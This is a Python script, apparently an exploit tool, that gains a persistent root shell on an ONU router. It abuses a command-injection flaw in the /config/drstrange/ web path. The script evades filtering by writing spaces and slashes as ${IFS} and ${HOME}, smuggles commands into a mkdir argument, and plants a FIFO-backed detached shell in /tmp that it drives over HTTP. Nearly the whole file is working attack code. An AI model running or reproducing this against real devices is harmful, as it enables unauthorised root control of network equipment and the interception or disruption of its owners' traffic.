#!/usr/bin/env python3
"""
ONU root console over the /config/drstrange/ injection point.

A detached `sh` is kept alive reading from FIFO /tmp/.ci and writing to
/tmp/.co.  Commands travel base64-encoded, so quotes, slashes and spaces never
need escaping.  Shell state (cwd, env, variables) persists between calls, so
this behaves like a real shell -- only the transport is HTTP instead of TCP.

Usage:
    python onu_console.py                   # interactive REPL
    python onu_console.py "ls -l /etc"      # one-shot
    python onu_console.py --restart         # recreate the remote session
"""
import base64
import re
import socket
import sys
import time

HOST = "192.168.1.1"
PORT = 80
TIMEOUT = 20.0
CHUNK = 2400                      # must stay well below PATH_MAX (4096)
MAX_CHUNKS = 30
MARK_B = "Bq7xK"
MARK_E = "Eq7xK"
DONE = "__DONE__"

# fd 9 holds the FIFO open read-write, so the reader never sees EOF when a
# writer closes -- that is what keeps one shell alive across many commands.
# The outer `sh /tmp/.cs` is intentionally NOT exec'd away: its cmdline stays
# visible in ps, which is how we tell whether the session is still healthy.
SETUP = """#!/bin/sh
exec 9<>/tmp/.ci
cd /
sh </tmp/.ci >/tmp/.co 2>&1
"""


def http_get(path, timeout=TIMEOUT):
    req = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        "User-Agent: console/1.0\r\n"
        "Accept: */*\r\n"
        "Connection: close\r\n\r\n"
    )
    buf = b""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((HOST, PORT))
        s.sendall(req.encode())
        while True:
            try:
                chunk = s.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            buf += chunk
    finally:
        s.close()
    return buf.decode("utf-8", "replace")


def enc(text):
    """URL-path escaping: space -> ${IFS}, slash -> ${HOME}."""
    return text.replace(" ", "${IFS}").replace("/", "${HOME}")


def b64(s):
    return base64.b64encode(s.encode()).decode()


def sh(cmd):
    """Execute a raw shell command, return its combined stdout+stderr."""
    payload = f'mkdir -- "{MARK_B}$({cmd}){MARK_E}"'
    body = http_get("/config/drstrange/;" + enc(payload))
    m = re.search(re.escape(MARK_B) + r"(.*)" + re.escape(MARK_E), body, re.S)
    if not m:
        return ""
    return m.group(1)


class Session:
    def __init__(self):
        self.offset = 0

    def alive(self):
        out = sh('ps|grep -c "[.]cs"').strip()
        return out.isdigit() and int(out) > 0

    def setup(self):
        sh("rm -f /tmp/.ci /tmp/.co /tmp/.cs")
        sh("mkfifo /tmp/.ci")
        sh(f"echo {b64(SETUP)}|base64 -d>/tmp/.cs")
        sh("chmod 755 /tmp/.cs")
        sh("setsid sh /tmp/.cs>/dev/null")
        time.sleep(0.8)
        self.offset = 0
        return self.alive()

    def ensure(self):
        return True if self.alive() else self.setup()

    def send(self, cmd):
        b64cmd = b64(cmd + "\n" + f"echo {DONE}$?\n")
        sh(f"echo {b64cmd}|base64 -d>/tmp/.ci")

    def drain(self, wait=8.0):
        deadline = time.time() + wait
        buf = ""
        for _ in range(MAX_CHUNKS):
            piece = sh(f"tail -c +{self.offset + 1} /tmp/.co|head -c {CHUNK}")
            if piece:
                buf += piece
                self.offset += len(piece.encode())
            if DONE in buf or time.time() > deadline:
                break
            time.sleep(0.2)
        return buf.split(DONE)[0].rstrip("\n")

    def filesize(self):
        out = sh("wc -c </tmp/.co").strip().split()
        return int(out[0]) if out and out[0].isdigit() else 0

    def run(self, cmd, wait=8.0):
        if not self.ensure():
            return "[!] remote session unavailable"
        # skip whatever the session already produced (each CLI call is a new
        # process, and the REPL may have drifted), then wait for the sentinel
        self.offset = self.filesize()
        self.send(cmd)
        time.sleep(0.12)
        return self.drain(wait)


def main():
    args = sys.argv[1:]
    sess = Session()

    if args and args[0] == "--restart":
        print("restarted:", sess.setup())
        return 0

    if args:
        sys.stdout.write(sess.run(" ".join(args), wait=12.0) + "\n")
        return 0

    print("ONU root shell over HTTP.  'exit' or Ctrl-D quits.")
    if not sess.ensure():
        print("[!] could not start remote session")
        return 1
    while True:
        try:
            line = input("onu# ")
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if line.strip() in ("exit", "quit"):
            break
        if line.strip():
            sys.stdout.write(sess.run(line) + "\n")
    return 0


if __name__ == "__main__":
    sys.exit(main())
